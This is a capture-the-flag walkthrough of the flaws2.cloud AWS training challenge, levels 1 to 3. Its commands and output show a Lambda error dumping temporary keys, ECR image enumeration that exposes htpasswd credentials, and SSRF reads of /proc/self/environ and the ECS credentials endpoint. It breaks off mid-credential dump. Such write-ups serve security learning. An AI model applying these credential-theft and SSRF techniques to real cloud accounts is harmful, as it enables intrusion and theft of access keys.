# flaws2.cloud
+ http://flaws2.cloud/

<center>
<pre>
      _  _       _  _                 _           _             _      _  _  _  _         _  _  _
    _(_)(_)     (_)(_)              _(_)_        (_)           (_)   _(_)(_)(_)(_)_    _ (_)(_)(_) _
 _ (_) _           (_)            _(_) (_)_      (_)           (_)  (_)          (_)  (_)         (_)
(_)(_)(_)          (_)          _(_)     (_)_    (_)     _     (_)  (_)_  _  _  _               _ (_)
   (_)             (_)         (_) _  _  _ (_)   (_)   _(_)_   (_)    (_)(_)(_)(_)_          _ (_)
   (_)             (_)         (_)(_)(_)(_)(_)   (_)  (_) (_)  (_)   _           (_)      _ (_)
   (_)           _ (_) _       (_)         (_)   (_)_(_)   (_)_(_)  (_)_  _  _  _(_)   _ (_) _  _  _
   (_)          (_)(_)(_)      (_)         (_)     (_)       (_)      (_)(_)(_)(_)    (_)(_)(_)(_)(_)
</pre>
</center>

## Solutions
- [Level 1](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/02_flaws2.cloud.md#level-1)
- [Level 2](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/02_flaws2.cloud.md#level-2)


### Level 1
Visit: http://level1.flaws2.cloud/

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup level1.flaws2.cloud
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
Name:	level1.flaws2.cloud
Address: 16.182.74.117
Name:	level1.flaws2.cloud
Address: 52.217.226.109
Name:	level1.flaws2.cloud
Address: 52.217.228.5
Name:	level1.flaws2.cloud
Address: 52.216.214.53
Name:	level1.flaws2.cloud
Address: 3.5.8.121
Name:	level1.flaws2.cloud
Address: 52.217.164.197
Name:	level1.flaws2.cloud
Address: 16.182.71.165
Name:	level1.flaws2.cloud
Address: 54.231.161.53
** server can't find level1.flaws2.cloud: NOTIMP

┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup 16.182.74.117
117.74.182.16.in-addr.arpa	name = s3-website-us-east-1.amazonaws.com.

Authoritative answers can be found from:
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/fa777b9d-fd78-4653-a62d-9792b6c9011f)

**AWS S3 Bucket:** s3-website-us-east-1.amazonaws.com

Navigate S3 URL: http://flaws2.cloud.s3-website-us-east-1.amazonaws.com/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/8508a9c9-43d7-4491-804a-f7af5e21090b)

Visit: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=%27 and **Raw Data**.

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/34833710-4da1-4d5d-9a3f-203cd96671bf)

AWS Keys Discovered using beautifying with https://jsonformatter.org/:
```
Error, malformed input
{
  "AWS_LAMBDA_LOG_STREAM_NAME": "2024/06/05/[$LATEST]fbe04cb6ec6f4cea8b130ac8aac1c59c",
  "LAMBDA_TASK_ROOT": "/var/task",
  "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129:2000",
  "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs8.10",
  "AWS_DEFAULT_REGION": "us-east-1",
  "_AWS_XRAY_DAEMON_PORT": "2000",
  "AWS_REGION": "us-east-1",
  "_HANDLER": "index.handler",
  "LAMBDA_RUNTIME_DIR": "/var/runtime",
  "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEDwaCXVzLWVhc3QtMSJHMEUCIQDtf48CnbD4QlyDtaBJYrfvSed8RQEto9ZxzDJMawgY9gIgc27rF+1OTtr/pf0adPwa/fvEGPQoSUhawRmg/rEeb+wq6QIIxP//////////ARADGgw2NTM3MTEzMzE3ODgiDOcV6OhhnIDXIMq4Uiq9Aii/VDUJO2Mg7c91WOlITZ/jA0bdurFE2BW05SL2ULvOOaC5ZwJHy74cqcVtjLOTnfXFc6/p43doDs0yDRVeKXTl8ZLGwXgROEc9vNnyk59FcQneEeY+Drh7934QtWi89uB9X8Elz7g9iqCY2V93/9mbX0wFIsjrFuF/PHL2T1VhbtRQbDCKLifxg9M9k47ahUq0GJtVe3BnqO2AfAvXALK8mfsvR99Yr4TnbsERs7LbqSd+mHQdLE81qT8UNlsIldIkO2WYvb1kBcjomfweKRK6AVyO3qftiduNL3CLo5E4L9Ej0isT6rsUEe+0vbw01W+tt3J1W+kZfqM/H2MCODtU+/sOBrAZDia68Kx6dhsIbkyav/jooP2GrNQZR1Z/alqdnPzUUrPO1nAMknntG6uwoQz4yqPy0jd5d5PEML/xgrMGOp4BGG1k+wUhKqVQr1THTm5rMIp3/i+wcfZFgP03eCKZNmJS4z9EjgxUVc60522sVF4OpeMjDe3vZSE+jeYzWYl4/Xl5Oq0ICjsxxZObNbVYZT34Ua2pwsqpng5CDBkjgO8MXr2qtwnP4a2mexFxqVmo9E3KJz0uPR29qKDkpLbSOsCeUl5gtCQVicu+HfmxAGH+cCOw1jxJjWMs3DZVe3E =",
  "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
  "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129",
  "AWS_ACCESS_KEY_ID": "ASIAZQNB3KHGC7JL3FO G",
  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/level1",
  "TZ": ":UTC",
  "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
  "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
  "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
  "AWS_SECRET_ACCESS_KEY": "t/GEkmglD1d8CfAhQs8/UCkW/XmkBIsf4QvWCIe I",
  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
  "AWS_LAMBDA_FUNCTION_NAME": "level1",
  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
  "AWS_LAMBDA_RUNTIME_API": "127.0.0.1:9001",
  "LANG": "en_US.UTF-8",
  "NODE_PATH": "/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules",
  "_X_AMZN_TRACE_ID": "Root=1-6660b9d9-352f609f409edda6385102fc;Parent=5d92efd13d33ef36;Sampled=0;Lineage=e547cb94:0"
}
```

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $tail -n 4 ~/.aws/credentials
[level1]
AWS_ACCESS_KEY_ID=ASIAZQNB3KHGC7JL3FO G
AWS_SECRET_ACCESS_KEY=t/GEkmglD1d8CfAhQs8/UCkW/XmkBIsf4QvWCIe I
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaCXVzLWVhc3QtMSJHMEUCIQDtf48CnbD4QlyDtaBJYrfvSed8RQEto9ZxzDJMawgY9gIgc27rF+1OTtr/pf0adPwa/fvEGPQoSUhawRmg/rEeb+wq6QIIxP//////////ARADGgw2NTM3MTEzMzE3ODgiDOcV6OhhnIDXIMq4Uiq9Aii/VDUJO2Mg7c91WOlITZ/jA0bdurFE2BW05SL2ULvOOaC5ZwJHy74cqcVtjLOTnfXFc6/p43doDs0yDRVeKXTl8ZLGwXgROEc9vNnyk59FcQneEeY+Drh7934QtWi89uB9X8Elz7g9iqCY2V93/9mbX0wFIsjrFuF/PHL2T1VhbtRQbDCKLifxg9M9k47ahUq0GJtVe3BnqO2AfAvXALK8mfsvR99Yr4TnbsERs7LbqSd+mHQdLE81qT8UNlsIldIkO2WYvb1kBcjomfweKRK6AVyO3qftiduNL3CLo5E4L9Ej0isT6rsUEe+0vbw01W+tt3J1W+kZfqM/H2MCODtU+/sOBrAZDia68Kx6dhsIbkyav/jooP2GrNQZR1Z/alqdnPzUUrPO1nAMknntG6uwoQz4yqPy0jd5d5PEML/xgrMGOp4BGG1k+wUhKqVQr1THTm5rMIp3/i+wcfZFgP03eCKZNmJS4z9EjgxUVc60522sVF4OpeMjDe3vZSE+jeYzWYl4/Xl5Oq0ICjsxxZObNbVYZT34Ua2pwsqpng5CDBkjgO8MXr2qtwnP4a2mexFxqVmo9E3KJz0uPR29qKDkpLbSOsCeUl5gtCQVicu+HfmxAGH+cCOw1jxJjWMs3DZVe3E =
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile level1
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e1a517cb-c9ad-497c-b616-4b5794482f82)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level1.flaws2.cloud --profile level1
                           PRE img/
2018-11-21 02:25:05      17102 favicon.ico
2018-11-21 07:30:22       1905 hint1.htm
2018-11-21 07:30:22       2226 hint2.htm
2018-11-21 07:30:22       2536 hint3.htm
2018-11-21 07:30:23       2460 hint4.htm
2018-11-21 07:30:17       3000 index.htm
2018-11-21 07:30:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html - --profile level1
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="description" content="AWS Security training">
    <meta name="keywords" content="aws,security,ctf,amazon,enterprise,defense,infosec,cyber,flaws2">
    <title>flAWS2.cloud</title>
    
    <link href="http://flaws2.cloud/css/bootstrap.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="http://flaws2.cloud/css/summitroute.css" rel="stylesheet">

    <link rel="icon" href="/favicon.ico" sizes="16x16 32x32 64x64" type="image/vnd.microsoft.icon">
</head>

<body>
    <div class="stretchforfooter">
        <div class="container">
            <nav class="navbar navbar-default" role="navigation">
                <div class="navbar-header">
                    <a class="navbar-brand" href="/"></a>
                </div>
                <div>
                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="http://flaws2.cloud" class="hvr-overline-from-center">flaws2.cloud</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>

        <hr class="gradient">

        <div class="content-section-a">
          <div class="container">
    <div class="row">
        <div class="col-sm-8 col-sm-offset-2">

<div class="content">
    <div class="row">
        <div class="col-sm-12">
            <center><h1>Level 1 - Secret</h1></center>
            <hr>
            The next level is at <a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a>
            
        </div>
    </div>
</div>

</body>
</html>
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/1bee43c1-7d50-4819-97e0-e12ebb70ad63)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a346c5c6-2a4e-4cf1-8493-94859287f49a)

Visit: http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/79f17389-7eb0-49c8-902e-c95a4f1f6ef3)

The next level: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud


### Level 2
Visit: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud

```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile level1
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2a2b5094-a1d9-4202-9fc9-01ce9c0af885)


```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws ecr list-images --repository-name level2 --registry-id 653711331788 --profile level1 --region us-east-1
{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9781fa8f-ebce-4bf4-852c-a3a48fd2755f)


```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest --profile level1 --region us-east-1 | jq '.images[].imageManifest | fromjson'
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "size": 5359,
    "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
  },
  "layers": [
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 43412182,
      "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 848,
      "digest": "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 619,
      "digest": "sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 168,
      "digest": "sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 32516034,
      "digest": "sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 217,
      "digest": "sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 619,
      "digest": "sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 893,
      "digest": "sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 508,
      "digest": "sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 213,
      "digest": "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935"
    }
  ]
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2d02d846-c388-4138-ad26-aa17e53d43b8)

Choose **digest** under **config**: 

```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" --profile level1 --region us-east-1
{
    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLWVhc3QtMSJGMEQCIFlpqmuJzybSDTbSxYZ6XqOgAnjcef%2BSg2V2nh3vhFobAiBY7DaCTixZSqzk9B1fP373gklZrp%2B3pyOZ7xDRF2%2FAzyrMAwjG%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAUaDDU5MTEwNTkxNDk1MiIMYD9sGjrJ8CE8Z4%2ByKqAD0OWCXgQkG%2BOfNxdTCdIKOLsSfHSDZeWib0X4V3gOIEI7AtdSmZ56%2FL27Q7JJDx4nDTamt115Y73f0LoldZ18FCudy8gAOazlr%2BNHEC4%2BWaMIGP3W94%2FiZKY37yQKoPWzmJD65chxB2IghE1IkapzF%2FtgwL%2FvjXoT8a7X7l8p25dsnguUx9ohVOdhehLj%2FxPDYxZ9sIXUk57QD0YUG6oaSxA0IU7PQHunpu6qF4PPn1VkFw9xaN7Us1KloXTEQWREzwyC46q0h9%2Bq7ci0F9N5THOjozX5glwj89BngzlR%2F6QiSHIyqaleNQYeXlHeVG3dHMdttZbkEYJC%2FvocT5K2YMn%2F5zAsNGg6N6K7d8gFPVplWR9%2BJEqqSQTbPMx4MRIkll%2FbKWdnCdyHamJShvHy6ynq0vMjOiHMgwbMpGRo5N4fyEwAOh%2BfL8oAZ052mAKXn5xQNMmyNdXxa0MsM3VubJfmZQ0sNFX2JjkzRbZnwqdDJxz1LZfvQL%2FolF8TX1k9iXSsUTBaaufzBwJh061RNTCEREg8ftTJqAnoec35pfIwtpODswY6ogGOA%2BnDhTTv9RoI6jbJBntMCjN9vx6v7ECW3ac3BD%2BYF4hdIKv7J0tQ7GCPqhYNdYCDfa0BUzZ6TXuPh4k0ZHYEY3PhPCsUUIw94L5Q2FVuhvLzyKoMlMZEBmgeINk6pAXpzwNzcEO4W0vum0qoAcSuckH6d%2FpSikwg7M8dUzIi%2FrCf%2BtX1JykTia6LSmCDlUa75SY3rGT5%2Bk1SjR%2BHgYVyLJI%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240605T210550Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3599&X-Amz-Credential=ASIAYTIFIPBEIMLUGEOM%2F20240605%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=c056fe26339e82539bfbe728412fef914dc596683c80b9325fc9495674e4abb7",
    "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e4f09c1b-3f0e-4772-b3d5-9fa16ba470eb)

Download the config file using browser:

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/6eef6630-798a-4444-a725-bbf9593428f5)

Grep username:password.

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $cat 1e964f10-a061-4e7b-9290-4447e821fe9a | grep "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"
{"architecture":"amd64","config":{"Hostname":"","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["sh","/var/www/html/start.sh"],"ArgsEscaped":true,"Image":"sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":null},"container":"ac1212c533fd9920b36cf3518caeb27b07e5efca6d40a0cfb07acc94c3f02055","container_config":{"Hostname":"ac1212c533fd","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"sh\" \"/var/www/html/start.sh\"]"],"ArgsEscaped":true,"Image":"sha256:6bb13d45a562a2f15ca30b6a895698b27231a190049f1d4489aeba4fa86a75fe","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{}},"created":"2018-11-27T03:32:59.959842964Z","docker_version":"18.09.0","history":[{"created":"2018-11-19T21:23:51.037171729Z","created_by":"/bin/sh -c #(nop) ADD file:efec03b785a78c01a6ade862d9a309f500ffa9f5f9314be26621f7fda0d5dfb8 in / "},{"created":"2018-11-19T21:23:51.855666335Z","created_by":"/bin/sh -c set -xe \t\t\u0026\u0026 echo '#!/bin/sh' \u003e /usr/sbin/policy-rc.d \t\u0026\u0026 echo 'exit 101' \u003e\u003e /usr/sbin/policy-rc.d \t\u0026\u0026 chmod +x /usr/sbin/policy-rc.d \t\t\u0026\u0026 dpkg-divert --local --rename --add /sbin/initctl \t\u0026\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \t\u0026\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \t\t\u0026\u0026 echo 'force-unsafe-io' \u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t\u0026\u0026 echo 'DPkg::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'APT::Update::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\";' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\t\u0026\u0026 echo 'Acquire::Languages \"none\";' \u003e /etc/apt/apt.conf.d/docker-no-languages \t\t\u0026\u0026 echo 'Acquire::GzipIndexes \"true\"; Acquire::CompressionTypes::Order:: \"gz\";' \u003e /etc/apt/apt.conf.d/docker-gzip-indexes \t\t\u0026\u0026 echo 'Apt::AutoRemove::SuggestsImportant \"false\";' \u003e /etc/apt/apt.conf.d/docker-autoremove-suggests"},{"created":"2018-11-19T21:23:52.559321408Z","created_by":"/bin/sh -c rm -rf /var/lib/apt/lists/*"},{"created":"2018-11-19T21:23:53.235657088Z","created_by":"/bin/sh -c mkdir -p /run/systemd \u0026\u0026 echo 'docker' \u003e /run/systemd/container"},{"created":"2018-11-19T21:23:53.455319926Z","created_by":"/bin/sh -c #(nop)  CMD [\"/bin/bash\"]","empty_layer":true},{"created":"2018-11-27T03:32:57.013663339Z","created_by":"/bin/sh -c apt-get update     \u0026\u0026 apt-get install -y nginx apache2-utils python    \u0026\u0026 apt-get clean     \u0026\u0026 rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*     \u0026\u0026 echo \"daemon off;\" \u003e\u003e /etc/nginx/nginx.conf"},{"created":"2018-11-27T03:32:58.202361504Z","created_by":"/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"},{"created":"2018-11-27T03:32:58.481042948Z","created_by":"/bin/sh -c #(nop) ADD file:b311a5fa51887368e53012f2f31aafc46e999e44c238c9e2b23f47019f846acd in /etc/nginx/sites-available/default "},{"created":"2018-11-27T03:32:58.803695628Z","created_by":"/bin/sh -c #(nop) ADD file:fd3724e587d17e4bc8690d9febe596b4141f9e217111be51d530c5b55dfde646 in /var/www/html/index.htm "},{"created":"2018-11-27T03:32:59.112401386Z","created_by":"/bin/sh -c #(nop) ADD file:f8fd45be7a30bffa5ade2f6a47934c19f4fe1a1343e7229e7e730029f1730801 in /var/www/html/proxy.py "},{"created":"2018-11-27T03:32:59.411617545Z","created_by":"/bin/sh -c #(nop) ADD file:d29d68489f34ad71849687ac2eb66ceaee28315017d779fcfd5858423afee402 in /var/www/html/start.sh "},{"created":"2018-11-27T03:32:59.6820302Z","created_by":"/bin/sh -c #(nop)  EXPOSE 80","empty_layer":true},{"created":"2018-11-27T03:32:59.959842964Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\" \"/var/www/html/start.sh\"]","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:41c002c8a6fd36397892dc6dc36813aaa1be3298be4de93e4fe1f40b9c358d99","sha256:647265b9d8bc572a858ab25a300c07c0567c9124390fd91935430bf947ee5c2a","sha256:819a824caf709f224c414a56a2fa0240ea15797ee180e73abe4ad63d3806cae5","sha256:3db5746c911ad8c3398a6b72aa30580b25b6edb130a148beed4d405d9c345a29","sha256:1c1ac3ae43d53b452e0dfb320a5c22cf8ff5e8068a7ecef6779600d14ad4751b","sha256:bc16ef0350ee1577dfe09696bff225b40d241b26a359c146ffd5746a8ce18931","sha256:5db51ba604f0593199b4d8705a21fe6b1bc6cee503f7468539f6a80aa3cc4750","sha256:4e7b9bca030ac43814d0a6c6afed36f70fc2bb01a9dd84705358f424af1dae1e","sha256:5494da4989bbd817e20ead7cbaa8985d9907db95ea07b3e212e2e483de767f1d","sha256:67df634e1db11f3a6533ed051811c8290b69d7104550617dcc79303304cc78bb"]}}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/910551d0-9b75-4e9b-88f3-134c58aa859b)

Login http://container.target.flaws2.cloud/ with **laws2**:**secret_password** credentials:

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/95582788-0fa7-4576-949e-58eb252f9fd6)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/40ee174f-4bb0-4560-a936-465ccf8d8540)


### Level 3
Visit: http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/

Check: http://container.target.flaws2.cloud/proxy/file:///proc/self/environ

```
HOSTNAME=ip-172-31-54-33.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/cb3fc49d-d169-4964-bb43-f6a5d33034bdAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/c53454aacff34019a681da88d44718fc-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/c53454aacff34019a681da88d44718fc-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/c53454aacff34019a681da88d44718fc-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e8b668d7-e75c-4ef0-9b82-40f13a280277)

Access: http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v4/c53454aacff34019a681da88d44718fc-3779599274

```
{"DockerId":"c53454aacff34019a681da88d44718fc-3779599274","Name":"level3","DockerName":"level3","Image":"653711331788.dkr.ecr.us-east-1.amazonaws.com/level2","ImageID":"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e","Labels":{"com.amazonaws.ecs.cluster":"arn:aws:ecs:us-east-1:653711331788:cluster/level3","com.amazonaws.ecs.container-name":"level3","com.amazonaws.ecs.task-arn":"arn:aws:ecs:us-east-1:653711331788:task/level3/c53454aacff34019a681da88d44718fc","com.amazonaws.ecs.task-definition-family":"level3","com.amazonaws.ecs.task-definition-version":"3"},"DesiredStatus":"RUNNING","KnownStatus":"RUNNING","Limits":{"CPU":2},"CreatedAt":"2024-05-10T21:30:27.873125754Z","StartedAt":"2024-05-10T21:30:27.873125754Z","Type":"NORMAL","Health":{"status":"UNHEALTHY","statusSince":"2024-05-10T21:32:28.248144681Z","exitCode":255,"output":"OCI runtime exec failed: exec failed: unable to start container process: exec: \"exit 0\": executable file not found in $PATH: unknown"},"LogDriver":"awslogs","LogOptions":{"awslogs-group":"/ecs/level3","awslogs-region":"us-east-1","awslogs-stream":"ecs/level3/c53454aacff34019a681da88d44718fc"},"ContainerARN":"arn:aws:ecs:us-east-1:653711331788:container/level3/c53454aacff34019a681da88d44718fc/866c9a9b-a7e8-4f32-a500-901bf63938ad","Networks":[{"NetworkMode":"awsvpc","IPv4Addresses":["172.31.54.33"],"AttachmentIndex":0,"MACAddress":"16:ff:e3:3e:39:81","IPv4SubnetCIDRBlock":"172.31.48.0/20","DomainNameServers":["172.31.0.2"],"DomainNameSearchList":["ec2.internal"],"PrivateDNSName":"ip-172-31-54-33.ec2.internal","SubnetGatewayIpv4Address":"172.31.48.1/20"}],"Snapshotter":"overlayfs"}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/618491d4-5cea-4a98-b32d-ed1e2dc41bd4)

**Visit:** http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cb3fc49d-d169-4964-bb43-f6a5d33034bd

```
{"RoleArn":"arn:aws:iam::653711331788:role/level3",
"AccessKeyId":"ASIAZQNB3KHGJRWV2W7 F",
"SecretAccessKey":"Wa3QjgyZbzYwMCq7lBez+jJ2hD1inK+q/AtjVtL f",
